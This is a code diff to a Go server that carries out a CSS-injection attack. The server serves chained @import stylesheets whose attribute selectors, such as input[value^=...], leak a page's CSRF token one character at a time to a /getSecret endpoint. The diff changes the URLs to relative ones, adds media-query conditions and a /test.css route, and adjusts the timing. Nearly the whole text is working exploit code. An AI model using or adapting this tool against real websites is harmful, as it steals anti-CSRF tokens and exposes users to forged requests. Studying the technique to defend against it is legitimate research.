@@ -13,7 +13,6 @@ var (
 	listOfChar string
 	verbose    bool
 	tokenLen   int
-	url        string
 )
 
 func hello(rw http.ResponseWriter, req *http.Request) {
@@ -24,7 +23,7 @@ func hello(rw http.ResponseWriter, req *http.Request) {
 	var webpage string = `
 	<html>
 		<input name="csrf" value="456es4f5fgd5g6qdrg5qdrg5qdr2k5uylqzeze5gs564g" class="csrf">
-		<style> @import url("/launchAttack?len=0"); </style>
+		<style> @import url("/launchAttack?len=0") (max-width: 100000px); </style>
 	</html>
 	`
 
@@ -58,12 +57,21 @@ func attack(rw http.ResponseWriter, req *http.Request) {
 	var css string = ""
 	for _, ch := range listOfChar {
 		css += "input[name=" + tokenName + "][value^=\"" + tokenValue + string(ch) + "\"] "
-		css += "{\n\tbackground-image: url(\"" + url + "/getSecret?char=" + string(ch) + "\");\n}\n\n"
+		css += "{\n\tbackground-image: url(\"/getSecret?char=" + string(ch) + "\");\n}\n\n"
 	}
 	//Send the response
 	rw.Header().Set("Content-Type", "text/css")
 	rw.WriteHeader(http.StatusOK)
 	fmt.Fprint(rw, css)
+}
+
+func test(rw http.ResponseWriter, req *http.Request) {
+	webpage := "@import url(\"/launchAttack?len=0\") (max-width: 100000px);\n"
+
+	//Send the response
+	rw.Header().Set("Content-Type", "text/css")
+	rw.WriteHeader(http.StatusOK)
+	fmt.Fprint(rw, webpage)
 }
 
 func launchAttack(rw http.ResponseWriter, req *http.Request) {
@@ -82,12 +90,13 @@ func launchAttack(rw http.ResponseWriter, req *http.Request) {
 
 		//Wait a little bit
 		for nb > len(tokenValue) {
-			time.Sleep(100000)
+			time.Sleep(5000000000)
+			fmt.Printf("len = %d wake up\n", nb)
 		}
 
 		//Create the CSS that will make two requests
-		webpage += "@import url(\"" + url + "/attack?len=" + index + "\");\n"
-		webpage += "@import url(\"" + url + "/launchAttack?len=" + strconv.Itoa(nb+1) + "\");\n"
+		webpage += "@import url(\"/attack?len=" + index + "\") (max-width: 100000px);\n"
+		webpage += "@import url(\"/launchAttack?len=" + strconv.Itoa(nb+1) + "\") (max-width: 100000px);\n"
 
 		//Send the response
 		rw.Header().Set("Content-Type", "text/css")
@@ -104,7 +113,6 @@ func StartTool(port int, secret string, listChar string, v bool, ls int) {
 	listOfChar = listChar
 	verbose = v
 	tokenLen = ls
-	url = "http://localhost:" + strconv.Itoa(port)
 
 	launchServer(port)
 }
@@ -117,6 +125,7 @@ func launchServer(port int) {
 	http.HandleFunc("/launchAttack", launchAttack)
 	http.HandleFunc("/attack", attack)
 	http.HandleFunc("/getSecret", getSecret)
+	http.HandleFunc("/test.css", test)
 
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 
